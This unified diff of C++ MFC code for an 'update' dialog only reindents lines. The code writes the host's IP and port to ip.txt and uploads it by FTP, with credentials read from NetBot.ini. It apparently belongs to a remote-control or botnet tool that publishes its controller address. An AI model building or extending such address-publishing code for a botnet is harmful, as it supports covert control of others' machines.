@@ -87,7 +87,7 @@ BOOL CUpdateDlg::OnInitDialog()
 	WSADATA wsaData;
 	WSAStartup(MAKEWORD(1,1),&wsaData);
 	char szhostname[128];
-    
+	
 	if( gethostname(szhostname, 128) == 0 )
 	{
 		
@@ -130,9 +130,9 @@ void CUpdateDlg::OnBtnFtpupdate()
 	GetDlgItem(IDC_COMBO_FTPPORT)->GetWindowText(str);
 	ip="["+ip+":"+str+"]";
 	HANDLE hFile;
-    hFile = CreateFile("ip.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    DWORD numWrite;
-    WriteFile (hFile,ip,ip.GetLength(), &numWrite, NULL);	
+	hFile = CreateFile("ip.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	DWORD numWrite;
+	WriteFile (hFile,ip,ip.GetLength(), &numWrite, NULL);	
 	CloseHandle(hFile);
 
 	//保存配置信息
@@ -195,7 +195,7 @@ void CUpdateDlg::OnBtnDnsupdate()
 void CUpdateDlg::ReadIniFile()
 {
 	char Path[255];
-    GetCurrentDirectory(255, Path);
+	GetCurrentDirectory(255, Path);
 	CString path;
 	path.Format("%s\\NetBot.ini",Path);
 	if(m_Ini.SetPath(path))
@@ -208,9 +208,9 @@ void CUpdateDlg::ReadIniFile()
 		m_FtpPass=m_Ini.GetKeyValue("FTP Setting","FtpPassword");
 		m_FtpUrl=m_Ini.GetKeyValue("FTP Setting","FilePath");
 	
-	    m_DnsUser =m_Ini.GetKeyValue("DNS Setting","DnsUser");
-	    m_DnsPass =m_Ini.GetKeyValue("DNS Setting","DnsPass");
-	    m_DnsDomain =m_Ini.GetKeyValue("DNS Setting","DnsDomain"); 
+		m_DnsUser =m_Ini.GetKeyValue("DNS Setting","DnsUser");
+		m_DnsPass =m_Ini.GetKeyValue("DNS Setting","DnsPass");
+		m_DnsDomain =m_Ini.GetKeyValue("DNS Setting","DnsDomain"); 
 	}
 }
 
@@ -238,13 +238,13 @@ DWORD CUpdateDlg::FtpUpdate()
 		pFTP=NULL;
 		return 0;
 	}
-       //上传
+	   //上传
 	if(pFTP->PutFile("ip.txt",m_FtpUrl))
 		MessageBox("更新IP成功!","FTP更新");
 	else
 		MessageBox("更新IP失败","FTP更新");
 
-    pFTP->Close();	
+	pFTP->Close();	
 
 	return 0;
 }
